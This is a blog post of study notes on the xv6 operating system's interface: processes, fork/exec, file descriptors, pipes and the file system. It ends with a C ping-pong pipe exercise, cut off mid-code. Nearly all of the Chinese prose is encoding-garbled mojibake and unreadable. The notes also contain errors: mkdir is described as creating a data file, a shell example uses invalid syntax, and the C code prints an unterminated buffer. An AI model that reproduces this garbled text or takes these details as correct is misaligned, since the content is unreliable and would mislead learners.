    <content type="html"><![CDATA[<h1 id="OS-interface"><a href="#OS-interface" class="headerlink" title="OS interface"></a>OS interface</h1><p><code>xv6</code>æ˜¯ä¸€ä¸ª <code>Unix</code> æ“ä½œç³»ç»Ÿï¼Œåˆ†ä¸ºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ã€‚å½“ä¸€ä¸ªè¿›ç¨‹éœ€è¦å‘èµ·ä¸€ä¸ªkernel serviceçš„æ—¶å€™ï¼Œå°±æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿiè°ƒç”¨ï¼Œæ˜¯ä¸€ä¸ªOS inerfaceã€‚</p><p><code>shell</code> å’Œä¸€äº›å…¶ä»–çš„ç”¨æˆ·æ€è¿›ç¨‹å‡è¿è¡Œåœ¨ç”¨æˆ·æ€ç©ºé—´ã€‚ <code>kernel</code> ä½¿ç”¨CPUæä¾›çš„ç¡¬ä»¶ä¿æŠ¤æœºåˆ¶ï¼Œæ¥ç¡®ä¿æ¯ä¸€ä¸ªåœ¨ç”¨æˆ·ç©ºé—´æ‰§è¡Œçš„è¿›ç¨‹éƒ½åªèƒ½æ¥è§¦åˆ°å®ƒè‡ªå·±çš„å†…ä»ç©ºé—´ã€‚å†…æ ¸æ‹¥æœ‰ç€éœ€è¦å‘è¿™äº›ç¡¬ä»¶ä¿æŠ¤è®¸å¯çš„æ‰§è¡Œæƒé™ï¼Œè€Œç”¨æˆ·æ²¡æœ‰è¿™äº›æƒé™ã€‚</p><span id="more"></span><h2 id="Processes-and-memory"><a href="#Processes-and-memory" class="headerlink" title="Processes and memory"></a>Processes and memory</h2><p>xv6ä¸‹çš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½å«æœ‰ç”¨æˆ·ç©ºé—´å†…å­˜ï¼ˆåŒ…æ‹¬æŒ‡ä»¤ï¼Œæ•°æ®å’Œæ ˆç©ºé—´ï¼‰å’Œç‹¬å±äºå†…æ ¸çš„è¿›ç¨‹çŠ¶æ€ä¿¡æ¯ã€‚Xv6åˆ†æ—¶è¿›ç¨‹ï¼šå°†ç­‰å¾…æ‰§è¡Œçš„è¿›ç¨‹é€æ˜çš„åˆ†ç»™ç©ºé—²çš„CPUã€‚è¿›ç¨‹ä¸æ‰§è¡Œçš„æ—¶å€™ï¼Œxv6ç³»ç»Ÿä¼šè®²CPUçš„å¯„å­˜å™¨ä¿¡æ¯ä¿å­˜èµ·æ¥ï¼Œå¹¶ä¸”åœ¨ä¸‹ä¸€æ¬¡æ‰§è¡Œçš„æ—¶å€™é‡æ–°æ¢å¤ã€‚</p><p>å†…æ ¸å¯¹æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªç›¸å…³çš„è¿›ç¨‹æè¿°ç¬¦ï¼ˆPIDï¼‰</p><p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡ <code>fork</code> åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œ <code>fork</code>ä¼šç»™æ–°çš„è¿›ç¨‹ä¸€ä¸ªå®Œå…¨ç›¸åŒçš„å†…å­˜å†…å®¹ï¼ˆåŒ…æ‹¬æŒ‡ä»¤å’Œæ•°æ®ï¼‰ï¼Œå¯¹äºæ–°è¿›ç¨‹å’ŒåŸæœ¬çš„è¿›ç¨‹éƒ½ä¼šæœ‰è¿”å›å€¼ã€‚è¿”å›ç»™åŸæœ¬è¿›ç¨‹æ–°è¿›ç¨‹çš„PIDï¼Œæ–°è¿›ç¨‹ä¼šè¿”å›0ï¼Œå¯ä»¥è§†ä½œçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ã€‚</p><p><code>exit</code> ç³»ç»Ÿè°ƒç”¨ä¼šè®©å½“å‰è¿›ç¨‹åœæ­¢æ‰§è¡Œï¼Œå¹¶ä¸”é‡Šæ”¾å†…å­˜ï¼Œæ‰“å¼€çš„æ–‡ä»¶ç­‰èµ„æºã€‚ <code>exit</code> éœ€è¦ä¸€ä¸ªæ•´æ•°å‚æ•°ï¼Œ0è¡¨ç¤ºæ­£å¸¸é€€å‡ºï¼Œ1è¡¨ç¤ºå¼‚å¸¸é€€å‡ºã€‚</p><p><code>wait</code> ç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›å½“å‰è¿›ç¨‹çš„å­è¿›ç¨‹çš„PIDï¼Œå¹¶ä¸”ä¼šå¤åˆ¶å­è¿›ç¨‹ <code>exit</code> çš„çŠ¶æ€ä¿¡æ¯ç»™ç­‰å¾…è€…ã€‚å¦‚æœè°ƒç”¨è€…çš„æ‰€æœ‰å­è¿›ç¨‹éƒ½æ²¡æœ‰ç¦»å¼€ï¼Œé‚£ä¹ˆ <code>wait</code> å°†ä¼šç­‰å¾…çŸ¥é“æœ‰å­è¿›ç¨‹é€€å‡ºã€‚å¦‚æœå½“å‰è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œå°±ä¼šç«‹é©¬è¿”å›-1ã€‚</p><p>å°½ç®¡çˆ¶å­è¿›ç¨‹æœ‰ç›¸åŒçš„å†…å­˜å’Œå¯„å­˜å™¨ï¼Œä½†å®é™…ä¸Šè¿è¡Œåœ¨ä¸åŒçš„å†…å­˜ç©ºé—´ï¼Œä½¿ç”¨ä¸åŒçš„å¯„å­˜å™¨ã€‚å…¶ä¸­ä¸€ä¸ªæ”¹å˜å¹¶ä¸ä¼šå½±å“å¦ä¸€ä¸ªã€‚</p><p><code>exec</code>ç³»ç»Ÿè°ƒç”¨å°†ä¼šç”¨ä¸€ä¸ªä»æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶åŠ è½½æ¥çš„å…¨æ–°çš„å†…å­˜ä»£æ›¿å½“å‰è¿›ç¨‹çš„å†…å­˜ã€‚è¿™ä¸ªæ–‡ä»¶å¿…é¡»æœ‰ç‰¹æ®Šçš„æ–‡ä»¶æ ¼å¼ï¼Œå¼€å§‹äºä¸€ä¸ªæŒ‡ä»¤ï¼Œå¹¶ä¸”åªåŒ…å«æŒ‡ä»¤å’Œæ•°æ®ä¿¡æ¯ã€‚è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¸å†ä¼šè¿”å›åŸå…ˆçš„è¿›ç¨‹ï¼Œä»æ–‡ä»¶ä¸­åŠ è½½çš„æŒ‡ä»¤å°†ä¼šæ ¹æ®ELFå¤´ä¸­çš„ <code>entry point</code> æ¥å¼€å§‹æ‰§è¡Œã€‚ <code>exec</code>éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼šåŒ…å«å¯æ‰§è¡Œéƒ¨åˆ†çš„æ–‡ä»¶åå’Œå­—ç¬¦ä¸²æ•°ç»„ã€‚</p><p>xv6 shell ä½¿ç”¨ä¸Šè¿°è°ƒç”¨æ¥ä»£è¡¨ç”¨æˆ·è¿è¡Œç¨‹åºã€‚shell çš„ä¸»è¦ç»“æ„å¾ˆç®€å•ï¼›å‚è§ main (user&#x2F;sh.c:145)ã€‚ä¸»å¾ªç¯ä½¿ç”¨ getcmd è¯»å–ç”¨æˆ·çš„ä¸€è¡Œè¾“å…¥ã€‚ç„¶åè°ƒç”¨ fork å‡½æ•°ï¼Œåˆ›å»º shell è¿›ç¨‹çš„å‰¯æœ¬ã€‚çˆ¶è¿›ç¨‹è°ƒç”¨ wait å‡½æ•°ï¼Œè€Œå­è¿›ç¨‹åˆ™è¿è¡Œå‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·åœ¨ shell ä¸­è¾“å…¥äº†â€œecho helloâ€ï¼Œåˆ™ runcmd å‡½æ•°å°†è¢«è°ƒç”¨ï¼Œå¹¶ä»¥â€œecho helloâ€ä½œä¸ºå‚æ•°ã€‚runcmd (user&#x2F;sh.c:58) è¿è¡Œå®é™…å‘½ä»¤ã€‚å¯¹äºâ€œecho helloâ€ï¼Œå®ƒå°†è°ƒç”¨ exec (user&#x2F;sh.c:78)ã€‚å¦‚æœ exec æ‰§è¡ŒæˆåŠŸï¼Œåˆ™å­è¿›ç¨‹å°†æ‰§è¡Œ echo ä¸­çš„æŒ‡ä»¤ï¼Œè€Œä¸æ˜¯ runcmd ä¸­çš„æŒ‡ä»¤ã€‚åœ¨æŸä¸ªæ—¶åˆ»ï¼Œecho ä¼šè°ƒç”¨ exit å‡½æ•°ï¼Œè¿™å°†å¯¼è‡´çˆ¶è¿›ç¨‹ä» main (user&#x2F;sh.c:145) ä¸­çš„ wait å‡½æ•°è¿”å›ã€‚</p><p>æ‚¨å¯èƒ½æƒ³çŸ¥é“ä¸ºä»€ä¹ˆ fork å’Œ exec å‡½æ•°ä¸åˆå¹¶åœ¨ä¸€ä¸ªè°ƒç”¨ä¸­ï¼›æˆ‘ä»¬ç¨åä¼šçœ‹åˆ°ï¼Œshell åœ¨å…¶ I&#x2F;O é‡å®šå‘å®ç°ä¸­åˆ©ç”¨äº†è¿™ç§åˆ†ç¦»ã€‚ä¸ºäº†é¿å…åˆ›å»ºé‡å¤è¿›ç¨‹ç„¶åç«‹å³æ›¿æ¢ï¼ˆä½¿ç”¨ execï¼‰å¸¦æ¥çš„æµªè´¹ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸é’ˆå¯¹æ­¤ç”¨ä¾‹ä¼˜åŒ–äº† fork çš„å®ç°ï¼Œå¹¶ä½¿ç”¨äº†è™šæ‹Ÿå†…å­˜æŠ€æœ¯ï¼Œä¾‹å¦‚å†™æ—¶å¤åˆ¶ï¼ˆå‚è§ 4.6 èŠ‚ï¼‰ã€‚</p><p>xv6ä¼šéšæ€§çš„ç”³è¯·å¤§å¤šæ•°ç”¨æˆ·å†…å­˜ã€‚æ¯”å¦‚ï¼š <code>fork</code> å­è¿›ç¨‹ä¼šå¤åˆ¶çˆ¶è¿›ç¨‹çš„memoryï¼Œ <code>exec</code> ä¼šallocateè¶³å¤Ÿçš„å†…å­˜æ¥æ”¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸€äº›è¿›ç¨‹ä¼šç”³è¯·å¾ˆå¤šè¿è¡Œæ—¶å†…å­˜ã€‚</p><h2 id="I-O-å’Œæ–‡ä»¶æè¿°ç¬¦"><a href="#I-O-å’Œæ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="I&#x2F;O å’Œæ–‡ä»¶æè¿°ç¬¦"></a>I&#x2F;O å’Œæ–‡ä»¶æè¿°ç¬¦</h2><p><code>fd</code> æ˜¯ä¸€ä¸ªå†…æ ¸ç®¡ç†çš„å°å‹æ•´æ•°ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥ä»å…¶ä¸­è¯»&#x2F;å†™ã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå­—å…¸ï¼Œè®¾å¤‡æˆ–è€…åˆ›å»ºä¸€ä¸ªç®¡é“æ¥å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚æ–‡ä»¶æè¿°ç¬¦æ¥å£å’Œå…¶ä»–æ–‡ä»¶ï¼Œç®¡é“ä»¥åŠè®¾å¤‡æ˜¯ä¸åŒçš„ï¼Œè¿™è®©ä»–ä»¬çœ‹èµ·æ¥åƒä¸€ä¸²å­—èŠ‚æµã€‚ I&#x2F;OæŒ‡çš„æ˜¯input&#x2F;outputã€‚</p><p>å†…æ ¸ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦ä½œä¸ºæ¯ä¸ªè¿›ç¨‹è¡¨çš„indexï¼Œæ‰€ä»¥æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªç§æœ‰çš„æ–‡ä»¶æè¿°ç¬¦é›†åˆã€‚0 as standard inputï¼Œand 1 as standard outputï¼Œ2 as standard errorã€‚</p><p>æ–‡ä»¶æè¿°ç¬¦çš„å‡ºç°ä½¿å¾— <code>cat</code> çš„å®ç°å˜å¾—éå¸¸çš„ç®€å•ã€‚å› ä¸º <code>cat</code> å¹¶æ²¡æœ‰åŠæ³•åŒºåˆ†æ˜¯ä»æ–‡ä»¶ï¼Œç»ˆç«¯è¿˜æ˜¯ç®¡é“ä¸­è¯»å–ã€‚</p><p><code>close</code> ç³»ç»Ÿè°ƒç”¨ä¼šé‡Šæ”¾ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œä½¿å¾—ä»–å°†æ¥èƒ½å¤Ÿè¢« <code>open, pip, dup</code> ç»™é‡æ–°ä½¿ç”¨ã€‚æ–‡ä»¶æè¿°ç¬¦çš„åˆ†é…æ€»æ˜¯ä»å½“å‰æœªä½¿ç”¨çš„æœ€ä½æ•°å­—å¼€å§‹ã€‚</p><p><code>fork</code> ä¼šå¤åˆ¶çˆ¶è¿›ç¨‹çš„ <code>fd table</code> ï¼Œè€Œ <code>exec</code> ä¼šä»£æ›¿çˆ¶è¿›ç¨‹çš„å†…å­˜ï¼Œä½†æ˜¯ä¼šä¿ç•™ <code>fd table</code> ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œçˆ¶å­è¿›ç¨‹æ‰€æœ‰çš„ <code>fd table</code> éƒ½æ˜¯ç‹¬ç«‹çš„ã€‚è™½ç„¶ä»–ä»¬å…±äº«æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ç‹¬ç«‹çš„ã€‚ä½†æ˜¯ä»–ä»¬å…±äº«åŒä¸€ä¸ªåç§»ã€‚å¾—ç›Šäº <code>wait</code> ç³»ç»Ÿè°ƒç”¨çš„å®ç°ï¼Œä½¿å¾—çˆ¶å­è¿›ç¨‹å¯ä»¥å…ˆåå†™å…¥å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(fork() == <span class="hljs-number">0</span>)&#123;<br>write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;hello &quot;</span>, <span class="hljs-number">6</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;world\n&quot;</span>, <span class="hljs-number">6</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å¯ä»¥æˆåŠŸæ‰“å°å‡º <code>hello world</code> åˆ°ç»ˆç«¯ã€‚</p><p><code>dup</code> ç³»ç»Ÿè°ƒç”¨å¯ä»¥å¤åˆ¶ä¸€ä¸ªå·²æœ‰çš„æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘åŒä¸€ä¸ªI&#x2F;Oè®¾å¤‡ã€‚è¿™ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦æ‹¥æœ‰åŒæ ·çš„æ–‡ä»¶åç§»ï¼Œå°±åƒ <code>fork</code> çš„ä¸¤ä¸ªå­è¿›ç¨‹å…±äº«æ–‡ä»¶æè¿°ç¬¦ä¸€æ ·ã€‚</p><p>example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> file1 file2 &gt; tmp1 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ¡å‘½ä»¤ä¼šå°† <code>file1</code> å’Œ <code>file2</code> çš„ä¿¡æ¯åˆ—å‡ºï¼ŒåŸæœ¬æ ‡å‡†outputåˆ°ç»ˆç«¯ï¼Œæ”¹ä¸ºæ ‡å‡†è¾“å‡ºåˆ°æ–‡ä»¶tmp1ï¼Œç„¶åé‡å®šå‘ fd:2 â†’ fd:1ï¼Œå³æ ‡å‡†é”™è¯¯2ä¹Ÿé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º1ï¼Œç„¶åè¾“å‡ºåˆ°tmp1æ–‡ä»¶ä¸­ã€‚</p><p>æ‰€ä»¥å°†æ–‡ä»¶çš„æ ‡å‡†è¾“å‡ºä»¥åŠé”™è¯¯å…¨éƒ¨éƒ½å†™å…¥ <code>tmp1</code> æ–‡ä»¶ä¸­ã€‚</p><h2 id="Pipes"><a href="#Pipes" class="headerlink" title="Pipes"></a>Pipes</h2><p><code>pipe</code> æ˜¯å†…æ ¸æš´éœ²ç»™è¿›ç¨‹çš„ä¸€å°å—ç¼“å†²åŒºï¼Œä»¥æˆå¯¹çš„æ–¹å¼å‡ºç°ï¼Œä¸€ä¸ªç”¨æ¥è¯»ï¼Œä¸€ä¸ªç”¨æ¥å†™ã€‚å†™æ•°æ®åˆ°ä¸€ä¸ªç®¡é“çš„ä¸€ç«¯ï¼Œä½¿å¾—æ•°æ®èƒ½å¤Ÿä»ç®¡é“çš„å¦ä¸€ç«¯è¿›è¡Œè¯»ã€‚ <code>pipe</code> ç»™è¿›ç¨‹é—´äº¤äº’æä¾›äº†ä¸€ä¸ªæ–¹å¼ã€‚</p><p><code>pipe[0]</code> æ˜¯è¯»ç«¯ï¼Œ <code>pipe[1]</code> æ˜¯å†™ç«¯ã€‚å¦‚æœæ²¡æœ‰å­—ç¬¦å†™å…¥ï¼Œ <code>pipe</code> ä¼šä¸€ç›´ç­‰å¾…ç›´åˆ°æœ‰æ•°æ®è¢«å†™å…¥ï¼Œæˆ–è€…æ‰€æœ‰æŒ‡å‘å†™ç«¯çš„æ–‡ä»¶æè¿°ç¬¦è¢«å…³é—­ã€‚</p><p><code>shell</code> ä¸­çš„ç®¡é“ç¬¦ <code>|</code> ä¼šåŒæ—¶åˆ›å»ºä¸¤ä¸ªå­è¿›ç¨‹ï¼Œå·¦è¾¹çš„å­è¿›ç¨‹è¾“å‡ºä½œä¸º <code>pipe</code> çš„å†™ç«¯ï¼Œå³è¾¹å­è¿›ç¨‹ä½œä¸º <code>pipe</code> çš„è¯»ç«¯ã€‚è¿™ä¸¤ä¸ªå­è¿›ç¨‹æ˜¯åŒæ—¶è¿›è¡Œçš„ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sleep</span>(5) | <span class="hljs-built_in">echo</span> hi<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤ä¼šç«‹åˆ»è¾“å‡º <code>hi</code>ï¼Œè€Œä¸ä¼šç­‰å¾…ã€‚</p><h2 id="File-system"><a href="#File-system" class="headerlink" title="File system"></a>File system</h2><p>xv6çš„æ–‡ä»¶ç³»ç»Ÿæä¾›äº†æ•°æ®æ–‡ä»¶ï¼ŒåŒ…å«ä¸å¯ç»ˆç«¯çš„å­—èŠ‚æ•°ç»„å’Œç›®å½•ï¼Œè¿™ä¸ªç›®å½•åŒ…å«æ•°æ®æ–‡ä»¶çš„æ–‡ä»¶åå’Œå…¶ä»–ç›®å½•åï¼Œæ•´ä¸ªç›®å½•å½¢æˆäº†ä¸€æ£µæ ‘ã€‚</p><p><code>mkdir</code> åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®æ–‡ä»¶, <code>mknod</code>åˆ›å»ºä¸€ä¸ªæ–°çš„è®¾å¤‡æ–‡ä»¶ã€‚ <code>mknod</code> åˆ›å»ºäº†ä¸€ä¸ªå±äºè®¾å¤‡çš„ç‰¹æ®Šæ–‡ä»¶ï¼Œå’Œè®¾å¤‡æ–‡ä»¶ç›¸å…³çš„æ˜¯ä¸»è®¾å¤‡å·å’Œæ¬¡è®¾å¤‡å·ï¼Œä»–ä»¬å”¯ä¸€çš„æ ‡è¯†çš„å†…æ ¸è®¾å¤‡ã€‚</p><p>æ–‡ä»¶çš„åå­—å’Œæ–‡ä»¶æœ¬èº«æ˜¯ä¸åŒçš„ã€‚ä¸€ä¸ª <code>inode</code> å”¯ä¸€çš„æ ‡è¯†äº†ä¸€ä¸ªå®é™…çš„æ–‡ä»¶ï¼ŒåŒ…å«è¿™ä¸ªæ–‡ä»¶çš„ç±»å‹ï¼Œé•¿åº¦ï¼Œåœ¨ç¡¬ç›˜ä¸­çš„ä½ç½®ä»¥åŠæœ‰å¤šå°‘ä¸ª <code>link</code> ä¸å®ƒç›¸å…³ã€‚ä¸€ä¸ªå®é™…çš„æ–‡ä»¶å¯ä»¥ç”¨å¤šä¸ª <code>link</code>  æ¥è¿›è¡Œé“¾æ¥ã€‚</p><p>The fstat system call retrieves information from the inode that a file descriptor refers to. It<br>fills in a struct stat, defined in stat.h (kernel&#x2F;stat.h) as:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> T_DIR 1 <span class="hljs-comment">// Directory</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> T_FILE 2 <span class="hljs-comment">// File</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> T_DEVICE 3 <span class="hljs-comment">// Device</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> &#123;</span><br><span class="hljs-type">int</span> dev; <span class="hljs-comment">// File systemâ€™s disk device</span><br>uint ino; <span class="hljs-comment">// Inode number</span><br><span class="hljs-type">short</span> type; <span class="hljs-comment">// Type of file</span><br><span class="hljs-type">short</span> nlink; <span class="hljs-comment">// Number of links to file</span><br>uint64 size; <span class="hljs-comment">// Size of file in bytes</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>link</code> system callä¼šåˆ›é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶åå­—æ¥æŒ‡å‘ä¸€ä¸ªå®é™…çš„æ–‡ä»¶ï¼ˆä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå®é™…æ–‡ä»¶çš„linkï¼‰</p><p>å¯¹åº”çš„è¿˜æœ‰ <code>unlink</code> system callã€‚ä»æ–‡ä»¶ç³»ç»Ÿä¸­ç§»é™¤ä¸€ä¸ªæ–‡ä»¶çš„åå­—ã€‚å½“ä¸€ä¸ªå®é™…çš„æ–‡ä»¶æ²¡æœ‰ <code>link</code> æŒ‡å‘ä¹‹åï¼Œä¼šåœ¨æ‰€æœ‰ç›¸å…³å®ƒçš„è¿›ç¨‹ç»“æŸä¹‹åä»ç¡¬ç›˜ä¸Šå½»åº•æŠ¹é™¤ï½</p><p><code>file utilities</code> æ˜¯Unixæä¾›ç»™shelçš„ä½œä¸ºç”¨æˆ·æ€çš„å¯è°ƒç”¨ç¨‹åºã€‚è¿™ä¸ªè®¾è®¡å…è®¸æ‰€æœ‰äººéƒ½å¯ä»¥é€šè¿‡å¢åŠ æ–°çš„åŸåŒºå»æ‹“å±• <code>command-line</code> æ¥å£ã€‚é™¤äº† <code>cd</code> ï¼Œè¢«å†™å…¥äº†shelçš„æºä»£ç ä¸­ã€‚</p><h2 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h2><p>Write a program that uses UNIX system calls to â€œping-pongâ€ a byte between two processes<br>over a pair of pipes, one for each direction. Measure the programâ€™s performance, in exchanges per second.</p><p>æˆ‘å†™çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCHANGE_NUM 10000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ping <span class="hljs-string">&quot;ping&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pong <span class="hljs-string">&quot;pong&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> pipe_parent_to_child[<span class="hljs-number">2</span>]; <span class="hljs-comment">// parent write, child read;</span><br>    <span class="hljs-type">int</span> pipe_child_to_parent[<span class="hljs-number">2</span>]; <span class="hljs-comment">// child write, parent write;</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">5</span>];<br>    pipe(pipe_parent_to_child);<br>    pipe(pipe_child_to_parent);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">start</span>, <span class="hljs-title">end</span>;</span><br>    <span class="hljs-type">double</span> time_diff;<br>    clock_gettime(CLOCK_MONOTONIC, &amp;start);<br>    <span class="hljs-keyword">if</span>(fork() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// use pipe_child_to_parent[0] &amp; pipe_parent_to_child[1]</span><br>        close(pipe_child_to_parent[<span class="hljs-number">0</span>]);<br>        close(pipe_parent_to_child[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; EXCHANGE_NUM; i++)&#123;<br>            <span class="hljs-keyword">if</span>(write(pipe_child_to_parent[<span class="hljs-number">1</span>], pong, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;child write failed!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(read(pipe_parent_to_child[<span class="hljs-number">0</span>], buf, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;child read failed\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No.%d, child read: %s\n&quot;</span>, i, buf);<br>        &#125;<br>        close(pipe_child_to_parent[<span class="hljs-number">1</span>]);<br>        close(pipe_parent_to_child[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        close(pipe_child_to_parent[<span class="hljs-number">1</span>]);<br>        close(pipe_parent_to_child[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; EXCHANGE_NUM; i++)&#123;<br>            <span class="hljs-keyword">if</span>(read(pipe_child_to_parent[<span class="hljs-number">0</span>], buf, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;parent read failed\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(write(pipe_parent_to_child[<span class="hljs-number">1</span>], ping, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;parent write failed\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No.%d, parent read: %s\n&quot;</span>, i, buf);<br>        &#125;<br>        close(pipe_child_to_parent[<span class="hljs-number">0</span>]);<br>        